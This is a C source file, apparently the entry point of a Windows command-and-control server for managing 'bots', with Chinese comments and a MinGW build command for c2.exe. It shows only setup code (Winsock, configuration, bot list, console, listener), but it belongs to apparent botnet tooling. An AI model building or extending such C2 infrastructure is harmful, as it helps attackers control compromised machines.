#include "c2_server.h"

// 全局变量定义
BotSession bot_list[MAX_BOTS];
CRITICAL_SECTION bot_mutex;
ServerConfig *global_config = NULL;

int main() {
    WSADATA wsaData;
    
    // 初始化Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "WSAStartup failed: %d\n", WSAGetLastError());
        return 1;
    }
    
    // 加载配置
    global_config = load_config(CONFIG_FILE);
    if (!global_config) {
        fprintf(stderr, "[!] Failed to load config\n");
        WSACleanup();
        return 1;
    }
    
    // 初始化bot管理器
    init_bot_manager();
    
    // 创建监听套接字
    SOCKET listen_socket = create_listen_socket();
    if (listen_socket == INVALID_SOCKET) {
        free_config(global_config);
        WSACleanup();
        return 1;
    }
    
    // 启动控制台界面
    start_console_interface();
    
    // 启动服务器
    start_server(listen_socket);
    
    // 清理资源
    DeleteCriticalSection(&bot_mutex);
    closesocket(listen_socket);
    free_config(global_config);
    cleanup_networking();
    
    return 0;
}

/* 
x86_64-w64-mingw32-gcc ./c2_server/main.c ./comm/net_util.c ./comm/net_util.h ./c2_server/network.c \
./comm/crypto.c ./comm/crypto.h \
./c2_server/bot_manager.c ./c2_server/config.c ./c2_server/console_ui.c -o c2.exe \
-D_WIN32_WINNT=0x0A00 \
-I/usr/x86_64-w64-mingw32/include \
-L/usr/x86_64-w64-mingw32/lib \
-lws2_32 -ljansson -lkernel32 -ladvapi32 -lntdll \
-static -Wno-deprecated-declarations -fno-stack-protector -O0
*/